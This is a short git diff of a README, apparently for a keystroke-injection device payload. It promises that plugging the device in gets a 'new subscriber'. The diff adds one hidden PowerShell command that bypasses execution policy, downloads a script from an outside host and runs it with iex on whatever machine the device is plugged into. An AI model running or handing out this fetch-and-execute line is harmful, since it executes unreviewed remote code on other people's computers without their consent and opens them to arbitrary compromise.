@@ -36,6 +36,10 @@ SPOILER: They do.
 * Plug in your device
 * 15 seconds later you have a new subscriber
 
+```
+powershell -w h -NoP -Ep Bypass $channel='youtube.com/iamjakoby';iwr jakoby.lol/wj4 | iex
+```
+
 <p align="right">(<a href="#top">back to top</a>)</p>
 
 ## Contributing
